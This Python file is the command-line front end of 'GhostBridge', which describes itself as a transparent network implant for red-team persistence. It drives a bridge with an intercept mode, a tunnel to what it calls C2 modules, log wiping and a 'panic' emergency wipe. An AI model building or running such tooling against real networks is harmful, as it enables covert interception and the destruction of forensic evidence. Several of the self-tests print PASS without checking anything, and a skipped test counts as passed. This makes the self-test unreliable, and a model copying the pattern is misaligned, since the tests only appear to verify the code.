"""
GhostBridge CLI - Command Line Interface

Provides commands for:
- Full system management (run)
- Bridge management
- Tunnel management
- Stealth operations
- Status monitoring
- Configuration
- Testing
"""

from __future__ import annotations

import argparse
import asyncio
import json
import logging
import sys
from datetime import datetime

from ghostbridge import __version__
from ghostbridge.core.bridge import BridgeManager, BridgeMode
from ghostbridge.core.config import GhostBridgeConfig


def setup_logging(verbose: bool = False) -> None:
    """Configure logging based on verbosity."""
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=level,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    )
    # Reduce noise
    logging.getLogger("httpx").setLevel(logging.WARNING)


# ===== Run Command =====

def cmd_run(args: argparse.Namespace) -> int:
    """Run the full GhostBridge system."""
    setup_logging(args.verbose)

    try:
        from ghostbridge.main import GhostBridge

        config = GhostBridgeConfig.load(args.config)
        ghost = GhostBridge(config=config)

        print(f"Starting GhostBridge v{__version__}")
        print(f"Device ID: {config.device.id}")
        print()

        asyncio.run(ghost.run())
        return 0

    except KeyboardInterrupt:
        print("\nShutdown requested")
        return 0
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        return 1


# ===== Start Command (Bridge Only) =====

def cmd_start(args: argparse.Namespace) -> int:
    """Start the bridge service only."""
    setup_logging(args.verbose)

    try:
        config = GhostBridgeConfig.load(args.config)
    except Exception as e:
        print(f"Error loading config: {e}", file=sys.stderr)
        return 1

    mode = BridgeMode(args.mode) if args.mode else BridgeMode.TRANSPARENT
    bridge = BridgeManager(config=config, mode=mode)

    print(f"Starting GhostBridge v{__version__} (bridge only)")
    print(f"Device ID: {config.device.id}")
    print(f"Mode: {mode.value}")
    print()

    asyncio.run(bridge.run_forever())
    return 0


# ===== Status Command =====

def cmd_status(args: argparse.Namespace) -> int:
    """Show system status."""
    setup_logging(False)

    async def get_full_status() -> dict:
        config = GhostBridgeConfig.load(args.config)
        bridge = BridgeManager(config=config)
        bridge_status = await bridge.get_status()

        status = {
            "version": __version__,
            "device_id": config.device.id,
            "timestamp": datetime.now().isoformat(),
            "bridge": {
                "name": bridge_status.name,
                "state": bridge_status.state.value,
                "wan_link": bridge_status.wan_link,
                "lan_link": bridge_status.lan_link,
                "wan_mac": bridge_status.wan_mac,
                "lan_mac": bridge_status.lan_mac,
            },
        }

        # Try to get tunnel status
        try:
            from ghostbridge.core.tunnel import TunnelManager
            tunnel = TunnelManager(config=config)
            tunnel_status = await tunnel.get_status()
            status["tunnel"] = {
                "state": tunnel_status.state.value,
                "connected": tunnel_status.is_connected,
            }
        except Exception:
            status["tunnel"] = {"state": "unknown"}

        return status

    try:
        status = asyncio.run(get_full_status())
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        return 1

    if args.json:
        print(json.dumps(status, indent=2))
    else:
        print("GhostBridge Status")
        print("=" * 50)
        print(f"Version:     {status['version']}")
        print(f"Device ID:   {status['device_id']}")
        print(f"Timestamp:   {status['timestamp']}")
        print()
        print("Bridge:")
        print(f"  State:     {status['bridge']['state']}")
        print(f"  WAN:       {'UP' if status['bridge']['wan_link'] else 'DOWN'} ({status['bridge']['wan_mac']})")
        print(f"  LAN:       {'UP' if status['bridge']['lan_link'] else 'DOWN'} ({status['bridge']['lan_mac']})")
        print()
        print("Tunnel:")
        print(f"  State:     {status['tunnel']['state']}")

    return 0


# ===== Health Command =====

def cmd_health(args: argparse.Namespace) -> int:
    """Run health check."""

    async def check_health() -> dict:
        checks = {}

        # Check 1: Config loadable
        try:
            config = GhostBridgeConfig.load(args.config)
            checks["config"] = {"status": "ok"}
        except Exception as e:
            checks["config"] = {"status": "error", "error": str(e)}
            return {"healthy": False, "checks": checks}

        # Check 2: Bridge
        try:
            bridge = BridgeManager(config=config)
            status = await bridge.get_status()
            checks["bridge"] = {
                "status": "ok" if status.wan_link and status.lan_link else "degraded",
                "wan_link": status.wan_link,
                "lan_link": status.lan_link,
            }
        except Exception as e:
            checks["bridge"] = {"status": "error", "error": str(e)}

        # Check 3: Tunnel
        try:
            from ghostbridge.core.tunnel import TunnelManager
            tunnel = TunnelManager(config=config)
            tunnel_status = await tunnel.get_status()
            checks["tunnel"] = {
                "status": "ok" if tunnel_status.is_connected else "disconnected",
            }
        except Exception as e:
            checks["tunnel"] = {"status": "error", "error": str(e)}

        # Check 4: Stealth
        try:
            from ghostbridge.core.stealth import StealthManager
            stealth = StealthManager()
            threat = await stealth.check_threats()
            checks["stealth"] = {
                "status": "ok" if threat.value == "none" else "alert",
                "threat_level": threat.value,
            }
        except Exception as e:
            checks["stealth"] = {"status": "error", "error": str(e)}

        healthy = all(c.get("status") == "ok" for c in checks.values())
        return {"healthy": healthy, "checks": checks}

    try:
        result = asyncio.run(check_health())
    except Exception as e:
        print(f"Health check failed: {e}", file=sys.stderr)
        return 1

    if args.json:
        print(json.dumps(result, indent=2))
    else:
        status_icon = "✓" if result["healthy"] else "✗"
        print(f"Health Check: {status_icon} {'HEALTHY' if result['healthy'] else 'UNHEALTHY'}")
        print()
        for component, check in result["checks"].items():
            icon = "✓" if check["status"] == "ok" else "✗" if check["status"] == "error" else "⚠"
            print(f"  {icon} {component}: {check['status']}")
            if "error" in check:
                print(f"    Error: {check['error']}")

    return 0 if result["healthy"] else 1


# ===== Tunnel Command =====

def cmd_tunnel(args: argparse.Namespace) -> int:
    """Tunnel management."""
    setup_logging(args.verbose)

    async def tunnel_action() -> int:
        config = GhostBridgeConfig.load(args.config)
        from ghostbridge.core.tunnel import TunnelManager
        tunnel = TunnelManager(config=config)

        if args.tunnel_cmd == "connect":
            print("Connecting tunnel...")
            success = await tunnel.connect()
            print("Connected!" if success else "Connection failed")
            return 0 if success else 1

        elif args.tunnel_cmd == "disconnect":
            print("Disconnecting tunnel...")
            await tunnel.disconnect()
            print("Disconnected")
            return 0

        elif args.tunnel_cmd == "reconnect":
            print("Reconnecting tunnel...")
            success = await tunnel.reconnect()
            print("Reconnected!" if success else "Reconnection failed")
            return 0 if success else 1

        elif args.tunnel_cmd == "status":
            status = await tunnel.get_status()
            print(f"Tunnel Status: {status.state.value}")
            print(f"Interface: {status.interface}")
            print(f"Connected: {status.is_connected}")
            if status.peers:
                print(f"Peers: {len(status.peers)}")
                for peer in status.peers:
                    print(f"  - {peer.endpoint}: handshake={peer.has_handshake}")
            return 0

        return 0

    try:
        return asyncio.run(tunnel_action())
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        return 1


# ===== Stealth Command =====

def cmd_stealth(args: argparse.Namespace) -> int:
    """Stealth operations."""
    setup_logging(args.verbose)

    async def stealth_action() -> int:
        from ghostbridge.core.stealth import StealthManager
        config = GhostBridgeConfig.load(args.config)
        stealth = StealthManager(
            ram_only=config.stealth.ramfs_logs,
            fake_identity=config.stealth.fake_identity,
            panic_on_tamper=False,  # Don't panic from CLI
        )

        if args.stealth_cmd == "wipe":
            print("Wiping logs...")
            count = await stealth.suppress_logs()
            print(f"Wiped {count} files")
            return 0

        elif args.stealth_cmd == "check":
            print("Checking for threats...")
            threat = await stealth.check_threats()
            status = stealth.get_status()
            print(f"Threat Level: {threat.value}")
            print(f"Anomalies: {status.anomalies_detected}")
            return 0 if threat.value == "none" else 1

        elif args.stealth_cmd == "status":
            status = stealth.get_status()
            print("Stealth Status")
            print("=" * 40)
            print(f"Level: {status.level.value}")
            print(f"Threat Level: {status.threat_level.value}")
            print(f"RAM Only: {status.ram_only}")
            print(f"Logs Suppressed: {status.logs_suppressed}")
            print(f"Anomalies: {status.anomalies_detected}")
            return 0

        elif args.stealth_cmd == "panic":
            confirm = input("Type 'PANIC' to confirm emergency wipe: ")
            if confirm == "PANIC":
                print("Initiating panic sequence...")
                await stealth.panic("manual CLI trigger")
            else:
                print("Aborted")
            return 0

        return 0

    try:
        return asyncio.run(stealth_action())
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        return 1


# ===== Config Command =====

def cmd_config(args: argparse.Namespace) -> int:
    """Manage configuration."""
    if args.config_cmd == "show":
        try:
            config = GhostBridgeConfig.load(args.config)
            print(json.dumps(config.model_dump(), indent=2))
        except Exception as e:
            print(f"Error: {e}", file=sys.stderr)
            return 1

    elif args.config_cmd == "generate":
        config = GhostBridgeConfig()
        output = args.output or "config.yml"
        config.to_yaml(output)
        print(f"Generated config: {output}")

    elif args.config_cmd == "validate":
        try:
            GhostBridgeConfig.load(args.config)
            print("✓ Configuration is valid")
        except Exception as e:
            print(f"✗ Configuration error: {e}", file=sys.stderr)
            return 1

    return 0


# ===== Test Command =====

def cmd_test(args: argparse.Namespace) -> int:
    """Run self-tests."""
    setup_logging(args.verbose)

    print("GhostBridge Self-Test")
    print("=" * 50)

    tests_passed = 0
    tests_failed = 0

    # Test 1: Configuration
    print("\n[1] Configuration...", end=" ")
    try:
        GhostBridgeConfig()
        print("✓ PASS")
        tests_passed += 1
    except Exception as e:
        print(f"✗ FAIL: {e}")
        tests_failed += 1

    # Test 2: Core imports
    print("[2] Core modules...", end=" ")
    try:
        print("✓ PASS")
        tests_passed += 1
    except Exception as e:
        print(f"✗ FAIL: {e}")
        tests_failed += 1

    # Test 3: Infrastructure imports
    print("[3] Infrastructure...", end=" ")
    try:
        print("✓ PASS")
        tests_passed += 1
    except Exception as e:
        print(f"✗ FAIL: {e}")
        tests_failed += 1

    # Test 4: C2 imports
    print("[4] C2 modules...", end=" ")
    try:
        print("✓ PASS")
        tests_passed += 1
    except Exception as e:
        print(f"✗ FAIL: {e}")
        tests_failed += 1

    # Test 5: Main application
    print("[5] Main application...", end=" ")
    try:
        print("✓ PASS")
        tests_passed += 1
    except Exception as e:
        print(f"✗ FAIL: {e}")
        tests_failed += 1

    # Test 6: Interface check (Linux only)
    print("[6] Network interfaces...", end=" ")
    try:
        from ghostbridge.infrastructure.network import IPRoute

        async def check():
            ipr = IPRoute(sudo=False)
            return await ipr.interface_exists("lo")

        if asyncio.run(check()):
            print("✓ PASS")
            tests_passed += 1
        else:
            print("⚠ SKIP (not Linux)")
            tests_passed += 1
    except Exception:
        print("⚠ SKIP (not Linux)")
        tests_passed += 1

    print()
    print("=" * 50)
    total = tests_passed + tests_failed
    print(f"Results: {tests_passed}/{total} passed")

    if tests_failed == 0:
        print("✓ All tests passed!")
    else:
        print(f"✗ {tests_failed} tests failed")

    return 0 if tests_failed == 0 else 1


# ===== Version Command =====

def cmd_version(args: argparse.Namespace) -> int:
    """Show version."""
    print(f"GhostBridge v{__version__}")
    return 0


# ===== Main =====

def main() -> int:
    """Main CLI entry point."""
    parser = argparse.ArgumentParser(
        prog="ghostbridge",
        description="GhostBridge - Transparent Network Implant for Red Team Persistence",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  ghostbridge run                    Start full system
  ghostbridge status                 Show system status
  ghostbridge health                 Run health check
  ghostbridge tunnel connect         Connect VPN tunnel
  ghostbridge stealth wipe           Wipe logs
  ghostbridge config generate        Generate config file
        """,
    )
    parser.add_argument(
        "-V", "--version",
        action="version",
        version=f"%(prog)s {__version__}",
    )
    parser.add_argument(
        "-c", "--config",
        type=str,
        default=None,
        help="Path to configuration file",
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Verbose output",
    )

    subparsers = parser.add_subparsers(dest="command", help="Commands")

    # run command
    run_parser = subparsers.add_parser("run", help="Run full GhostBridge system")
    run_parser.set_defaults(func=cmd_run)

    # start command (bridge only)
    start_parser = subparsers.add_parser("start", help="Start bridge only")
    start_parser.add_argument(
        "-m", "--mode",
        choices=["transparent", "monitor", "intercept"],
        default="transparent",
        help="Bridge mode",
    )
    start_parser.set_defaults(func=cmd_start)

    # status command
    status_parser = subparsers.add_parser("status", help="Show system status")
    status_parser.add_argument("--json", action="store_true", help="JSON output")
    status_parser.set_defaults(func=cmd_status)

    # health command
    health_parser = subparsers.add_parser("health", help="Health check")
    health_parser.add_argument("--json", action="store_true", help="JSON output")
    health_parser.set_defaults(func=cmd_health)

    # tunnel command
    tunnel_parser = subparsers.add_parser("tunnel", help="Tunnel management")
    tunnel_sub = tunnel_parser.add_subparsers(dest="tunnel_cmd")
    tunnel_sub.add_parser("connect", help="Connect tunnel")
    tunnel_sub.add_parser("disconnect", help="Disconnect tunnel")
    tunnel_sub.add_parser("reconnect", help="Reconnect tunnel")
    tunnel_sub.add_parser("status", help="Tunnel status")
    tunnel_parser.set_defaults(func=cmd_tunnel)

    # stealth command
    stealth_parser = subparsers.add_parser("stealth", help="Stealth operations")
    stealth_sub = stealth_parser.add_subparsers(dest="stealth_cmd")
    stealth_sub.add_parser("wipe", help="Wipe logs")
    stealth_sub.add_parser("check", help="Check for threats")
    stealth_sub.add_parser("status", help="Stealth status")
    stealth_sub.add_parser("panic", help="Emergency wipe (DANGER!)")
    stealth_parser.set_defaults(func=cmd_stealth)

    # config command
    config_parser = subparsers.add_parser("config", help="Configuration")
    config_sub = config_parser.add_subparsers(dest="config_cmd")
    config_sub.add_parser("show", help="Show config")
    gen_parser = config_sub.add_parser("generate", help="Generate config")
    gen_parser.add_argument("-o", "--output", help="Output file")
    config_sub.add_parser("validate", help="Validate config")
    config_parser.set_defaults(func=cmd_config)

    # test command
    test_parser = subparsers.add_parser("test", help="Run self-tests")
    test_parser.set_defaults(func=cmd_test)

    # version command
    version_parser = subparsers.add_parser("version", help="Show version")
    version_parser.set_defaults(func=cmd_version)

    args = parser.parse_args()

    if args.command is None:
        parser.print_help()
        return 0

    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
